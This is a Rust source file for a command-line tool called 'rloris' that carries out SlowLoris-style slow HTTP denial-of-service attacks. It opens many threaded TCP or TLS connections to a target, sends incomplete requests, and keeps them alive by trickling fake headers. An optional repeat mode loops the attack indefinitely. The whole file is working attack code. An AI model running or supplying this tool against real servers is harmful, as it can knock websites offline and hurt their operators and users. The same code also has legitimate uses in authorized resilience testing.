// For std::thread::sleep_ms.
#![allow(deprecated)]

extern crate docopt;
extern crate rustc_serialize;
extern crate openssl;
#[macro_use] extern crate log;
extern crate env_logger;

use docopt::Docopt;
use std::net::TcpStream;
use std::io::{Read, Write};
use std::thread;
use std::thread::sleep_ms;
use openssl::ssl::{SslMethod, SslConnectorBuilder};

const USAGE: &'static str = "
rloris - SlowLoris and other Slow HTTP DoSes in Rust

Usage:
    rloris <target> [--ssl] [--port=<port>] [--timeout=<timeout>] [--cycles=<cycles>] [--domain=<domain>] [--nofinalize] [--repeat] [--threads=<threads>] [--post]
    rloris (-h | --help)

Options:
    -h --help       Show this screen.
    --post          Use POST rather than GET as the default HTTP verb.
    --ssl           Use SSL. Changes default port to 443.
    --port=P        Use port P. Defaults to 80 for plaintext, 443 for SSL.
    --timeout=T     Total time for a single request, in milliseconds. [default: 10000]
    --cycles=C      Total number of additional \"keepalive\" headers to be sent. [default: 10]
    --domain=D      Override the domain name for SSL connections (e.g., if you're connecting to a raw IP address)
    --repeat        Perform the attack repeatedly (WARNING - Can produce a DoS condition!)
    --threads=T     The number of concurrent threads to spin off. [default: 1]
";

#[derive(Debug, RustcDecodable)]
struct Args {
    arg_target: String,
    flag_port: Option<usize>,
    flag_timeout: u32,
    flag_cycles: u32,
    flag_ssl: bool,
    flag_nofinalize: bool,
    flag_domain: Option<String>,
    flag_repeat: bool,
    flag_threads: usize,
    flag_post: bool
}

#[derive(Debug, Clone)]
struct Target {
    domain: String,
    designator: String,
}

impl Target {
    fn new(target: String, port: usize) -> Self {
        Target {
            domain: format!("{}", target),
            designator: format!("{}:{}", target, port)
        }
    }
    fn get_designator(&self) -> &str {
        &self.designator
    }
    fn get_domain(&self) -> &str {
        &self.domain
    }
    fn set_domain(&mut self, domain: &str) {
        self.domain = domain.into();
    }
}

/// request_attack performs a SlowLoris style delay request attack against a server
/// which can be written to via the given `connection` (reader/writer). 
/// `timeout` is the total time for the attack to progress, in milliseconds.
/// `cycles` is the number of times a new fake header should be written, or 0 for no additional headers.
/// `finalize` sets whether or not to send the terminating `\r\n`, and `post` changes the verb from GET to POST.
/// `threadn` is the thread number of this thread.
fn request_attack<T: Sized + Read + Write>(connection: &mut T, timeout: u32, cycles: u32, finalize: bool, post: bool, threadn: usize) {
    // Start a valid HTTP request
    let initial_request = if post {b"POST / HTTP/1.0\r\n"} else {b"GET  / HTTP/1.0\r\n"};
    connection.write_all(initial_request)
        .unwrap_or_else(|e| {error!("[REQUEST:{}] !!! Couldn't write GET request: {}", threadn, e); panic!();});
    info!("[REQUEST:{}] Wrote {} request.", threadn, if post {"POST"} else {"GET"});

    // Delay cycle
    // Conditional here limits requests to one per ten milliseconds
    let real_cycles = if cycles < timeout/10 {cycles} 
                      else {info!("[REQUEST] Too many cycles! Limiting."); timeout/10};
    info!("[REQUEST:{}] Beginning delay attack: {} ms, {} cycles, {} ms/cycle.", threadn, timeout, real_cycles, timeout/real_cycles);
    for _ in 0..(real_cycles) {
        // Timeout / cycles gives the number of ms for one cycle
        sleep_ms(timeout / cycles);
        connection.write_all(b"X-Not-Real: \"Some Bullshit\"\r\n")
            .unwrap_or_else(|e| {error!("[REQUEST:{}] !!! Couldn't write header. {}", threadn, e); panic!();});
    }

    if finalize {
        connection.write_all(b"\r\n")
            .unwrap_or_else(|e| {error!("[REQUEST:{}] !!! Couldn't write finalizer. {}", threadn, e); panic!();});
        info!("[REQUEST:{}] Wrote finalizer.", threadn);
        let mut res = vec![];
        connection.read_to_end(&mut res).unwrap_or_else(|e| {error!("[REQUEST:{}] Failed to read response. {}", threadn, e); panic!();});
        debug!("[REQUEST:{}] Response length: {}", threadn, res.len());
    } else {
        info!("[REQUEST:{}] Terminating without finalizer.", threadn);
    }
}

fn main() {
    // Set up logging
    env_logger::init().unwrap();
    debug!("Logging successfully initialized.");
    let args: Args = Docopt::new(USAGE)
                            .and_then(|d| d.decode())
                            .unwrap_or_else(|e| e.exit());

    // The default port is 80, but for SSL it's 443.
    let default_port = if args.flag_ssl { 443 } else { 80 };
    let port = args.flag_port.unwrap_or(default_port);

    let finalize = !args.flag_nofinalize;
    let cycles = args.flag_cycles;
    let timeout = args.flag_timeout;
    let repeat = args.flag_repeat;
    let threads = args.flag_threads;
    let ssl = args.flag_ssl;
    let post = args.flag_post;
    // Extract targetting information
    let mut target = Target::new(args.arg_target, port);

    // Check for domain override
    if let Some(domain) = args.flag_domain {
        target.set_domain(&domain);
    }

    loop {
        println!("Beginning SlowLoris against target {} with {} threads.", target.get_designator(), threads);
        println!("\tThis is expected to take {} seconds.", timeout as f32/1000.0);
        let mut handles = Vec::with_capacity(threads);
        for threadn in 0..threads {
            let target = target.clone();
            handles.push(
                thread::spawn(move || {
                    // Attempt to connect to the target.
                    let mut tcp_stream = TcpStream::connect(target.get_designator())
                        .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Couldn't connect. {}", threadn, e); panic!()});
                    info!("[CONTROL:{}] Succesfully connected to {}.", threadn, target.get_designator());
                    // If needed, connect SSL to the target.
                    if ssl {
                        // Attempt to set up SSL
                        let connector = SslConnectorBuilder::new(SslMethod::tls())
                            .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Failed to build SSL functionality. {}", threadn, e); panic!();})
                            .build();
                        debug!("[CONTROL:{}] Built SSL functionality.", threadn);
                        // Attempt to connect SSL
                        let mut ssl_stream = connector.connect(target.get_domain(), tcp_stream)
                            .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Couldn't connect TLS. {}\nDid you provide a domain name, not an IP?", threadn, e); panic!();});
                        info!("[CONTROL:{}] Successfully connected with TLS.", threadn);
                        request_attack(&mut ssl_stream, timeout, cycles, finalize, post, threadn);
                    } else {
                        request_attack(&mut tcp_stream, timeout, cycles, finalize, post, threadn);
                    }
                })
            );
        }
        for handle in handles {
            let val = handle.join();
        }
        if !repeat {break;}
    }
}
